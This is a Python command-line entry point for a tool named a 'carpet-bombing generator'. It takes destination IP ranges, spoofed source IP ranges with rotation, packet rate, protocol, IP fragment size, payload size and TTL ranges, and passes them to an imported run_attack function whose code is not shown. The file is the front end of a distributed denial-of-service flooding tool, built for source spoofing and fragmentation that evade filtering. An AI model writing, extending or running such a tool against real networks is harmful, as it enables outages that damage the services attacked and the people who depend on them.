"""Command-line entry point for the V5.2 carpet-bombing generator."""

from __future__ import annotations

import argparse

try:
    from .attack_config import ATTACK_PROTOCOLS, DEFAULT_TCP_PORTS, DEFAULT_UDP_PORTS, AttackConfig
    from .ip_parsing import parse_destinations, parse_sources
    from .traffic_sender import run_attack
except ImportError:
    from attack_config import ATTACK_PROTOCOLS, DEFAULT_TCP_PORTS, DEFAULT_UDP_PORTS, AttackConfig
    from ip_parsing import parse_destinations, parse_sources
    from traffic_sender import run_attack


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Advanced fragmented carpet-bombing generator.")

    dst_group = parser.add_mutually_exclusive_group(required=True)
    dst_group.add_argument("--dst-ip", help="Single destination IP for classic DDoS")
    dst_group.add_argument("--dst-range", help="Destination range, example: 10.20.0.1-10.20.0.80")

    src_group = parser.add_mutually_exclusive_group(required=True)
    src_group.add_argument("--src-ip", help="Single source IP for crafted packets")
    src_group.add_argument("--src-range", help="Source range, example: 10.10.1.1-10.10.1.250")
    src_group.add_argument("--src-ips", help="Comma-separated source IPs")

    parser.add_argument("--duration", type=int, default=30, help="Attack duration in seconds")
    parser.add_argument("--pps", type=int, default=200, help="Packets per second before fragmentation")
    parser.add_argument("--protocol", choices=[*ATTACK_PROTOCOLS, "mixed"], default="udp")
    parser.add_argument("--fragsize", type=int, default=300, help="IP fragment size")
    parser.add_argument(
        "--fragment-mode",
        choices=["manual", "auto", "none"],
        default="manual",
        help="manual=Scapy fragment() before send, auto/none=send packet as-is",
    )
    parser.add_argument("--payload-size", type=int, default=4000, help="Raw payload size in bytes")
    parser.add_argument("--ttl-min", type=int, default=40)
    parser.add_argument("--ttl-max", type=int, default=64)
    parser.add_argument("--src-rotation-interval", type=float, default=5.0)
    parser.add_argument("--tcp-ports", nargs="+", type=int, default=DEFAULT_TCP_PORTS)
    parser.add_argument("--udp-ports", nargs="+", type=int, default=DEFAULT_UDP_PORTS)
    return parser.parse_args()


def build_config(args: argparse.Namespace) -> AttackConfig:
    config = AttackConfig(
        src_ips=parse_sources(args),
        dst_ips=parse_destinations(args),
        duration=args.duration,
        pps=args.pps,
        protocol=args.protocol,
        payload_size=args.payload_size,
        fragment_mode=args.fragment_mode,
        fragsize=args.fragsize,
        ttl_min=args.ttl_min,
        ttl_max=args.ttl_max,
        src_rotation_interval=args.src_rotation_interval,
        tcp_ports=args.tcp_ports,
        udp_ports=args.udp_ports,
    )
    config.validate()
    return config


def main() -> int:
    run_attack(build_config(parse_args()))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
